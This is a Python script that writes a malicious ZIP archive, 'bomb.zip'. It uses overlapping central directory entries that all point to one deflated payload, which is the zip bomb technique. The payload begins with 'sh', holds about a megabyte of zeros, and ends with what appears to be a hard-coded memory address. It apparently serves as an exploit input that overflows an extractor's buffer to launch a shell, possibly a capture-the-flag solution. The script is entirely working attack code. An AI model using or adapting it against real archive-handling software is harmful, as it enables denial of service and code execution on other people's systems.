import struct
import zlib

##############################################
MAX_UNCOMPRESSED_SIZE = 1000001
NUM_FILES = 20
END_DATA = b'P\xc7\xdf\xf7\xff\x7f\x00\x00'
END_DATA += b"\x00" * 12  # padding
START_DATA = b"sh"
OUTPUT_FILE = "./bomb.zip"
##############################################


# APPNOTE.TXT 4.4.5
# 8 - The file is Deflated
COMPRESSION_METHOD_DEFLATE = 8

# APPNOTE.TXT 4.4.3.2
# 2.0 - File is compressed using Deflate compression
ZIP_VERSION = 20

MOD_DATE = 0x0548
MOD_TIME = 0x6ca0


class LocalFileHeader:
    def __init__(self, compressed_size, uncompressed_size, crc, filename, compression_method=COMPRESSION_METHOD_DEFLATE, extra_tag=None, extra_length_excess=0):
        self.compressed_size = compressed_size
        self.uncompressed_size = uncompressed_size
        self.crc = crc
        self.filename = filename
        self.compression_method = compression_method
        self.extra_tag = extra_tag
        self.extra_length_excess = extra_length_excess

    def serialize(self):
        # APPNOTE.TXT 4.5.3 says that in the local file header, unlike the
        # central directory header, we must include both uncompressed_size and
        # compressed_size in the Zip64 extra field, even if one of them is not
        # so big as to require Zip64.
        extra = b""
        if self.extra_length_excess > 0:
            extra += struct.pack("<HH", self.extra_tag,
                                 self.extra_length_excess)

        # APPNOTE.TXT 4.3.7
        return struct.pack("<LHHHHHLLLHH",
                           0x04034b50,  # signature
                           ZIP_VERSION,
                           0,          # flags
                           self.compression_method,    # compression method
                           MOD_TIME,   # modification time
                           MOD_DATE,   # modification date
                           self.crc,   # CRC-32
                           self.compressed_size,     # compressed size
                           self.uncompressed_size,   # uncompressed size
                           len(self.filename),     # filename length
                           len(extra) + self.extra_length_excess,  # extra length
                           ) + self.filename + extra


class CentralDirectoryHeader:
    # template is a LocalFileHeader instance.
    def __init__(self, local_file_header_offset, template):
        self.local_file_header_offset = local_file_header_offset
        self.compressed_size = template.compressed_size
        self.uncompressed_size = template.uncompressed_size
        self.crc = template.crc
        self.filename = template.filename
        self.compression_method = template.compression_method

    def serialize(self):
        assert self.compressed_size <= 0xfffffffe, self.compressed_size
        assert self.local_file_header_offset <= 0xfffffffe, self.local_file_header_offset

        extra = b""

        # APPNOTE.TXT 4.3.12
        return struct.pack("<LHHHHHHLLLHHHHHLL",
                           0x02014b50,  # signature
                           # version made by (0 - MS-DOS/FAT compatible)
                           (0 << 8) | ZIP_VERSION,
                           ZIP_VERSION,            # version needed to extract
                           0,          # flags
                           self.compression_method,    # compression method
                           MOD_TIME,   # modification time
                           MOD_DATE,   # modification date
                           self.crc,   # CRC-32
                           self.compressed_size,   # compressed size
                           self.uncompressed_size,   # uncompressed size
                           len(self.filename),     # filename length
                           len(extra),  # extra length
                           0,          # file comment length
                           0,          # disk number where file starts
                           0,          # internal file attributes
                           0,          # external file attributes
                           self.local_file_header_offset,  # offset of local file header
                           ) + self.filename + extra


class EndOfCentralDirectory:
    def __init__(self, cd_num_entries, cd_size, cd_offset):
        self.cd_num_entries = cd_num_entries
        self.cd_size = cd_size
        self.cd_offset = cd_offset

    def serialize(self):
        result = []
        # APPNOTE.TXT 4.3.16 End of central directory record
        result.append(struct.pack("<LHHHHLLH",
                                  0x06054b50,  # signature
                                  0,          # number of this disk
                                  0,          # disk of central directory
                                  self.cd_num_entries,    # number of central directory entries on this disk
                                  self.cd_num_entries,    # number of central directory entries total
                                  self.cd_size,       # size of central directory
                                  self.cd_offset,     # offset of central directory
                                  0,          # comment length
                                  ))
        return b"".join(result)


FILENAME_ALPHABET = b"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
def filename_for_index(i):
    letters = []
    while True:
        letters.insert(0, FILENAME_ALPHABET[i % len(FILENAME_ALPHABET)])
        i = i // len(FILENAME_ALPHABET) - 1
        if i < 0:
            break
    return bytes(letters)

def deflate(data, compresslevel=9):
        compress = zlib.compressobj(
            compresslevel,        # level: 0-9
            zlib.DEFLATED,        # method: must be DEFLATED
            -zlib.MAX_WBITS,      # window size in bits:
            #   -15..-8: negate, suppress header
            #   8..15: normal
            #   16..30: subtract 16, gzip header
            zlib.DEF_MEM_LEVEL,   # mem level: 1..8/9
            0                     # strategy:
            #   0 = Z_DEFAULT_STRATEGY
            #   1 = Z_FILTERED
            #   2 = Z_HUFFMAN_ONLY
            #   3 = Z_RLE
            #   4 = Z_FIXED
        )
        deflated = compress.compress(data)
        deflated += compress.flush()
        return deflated

with open(OUTPUT_FILE, "wb") as f:
    data = START_DATA + b"\x00" * \
        (MAX_UNCOMPRESSED_SIZE - len(END_DATA) - len(START_DATA)) + END_DATA
    main_crc = zlib.crc32(data) & 0xffffffff
    kernel = deflate(data)
    n = len(data)

    central_directory = []
    offset = 0

    main_file = LocalFileHeader(
        len(kernel), n, main_crc, filename_for_index(0))
    main_file_offset = offset
    offset += f.write(main_file.serialize())
    offset += f.write(kernel)

    cd_offset = offset
    for i in range(NUM_FILES):
        cd_header = CentralDirectoryHeader(main_file_offset, main_file)
        cd_header.filename = filename_for_index(i)
        offset += f.write(cd_header.serialize())
    for cd_header in central_directory:
        offset += f.write(cd_header.serialize())
    cd_size = offset - cd_offset

    offset += f.write(EndOfCentralDirectory(len(central_directory) + NUM_FILES, cd_size, cd_offset).serialize())
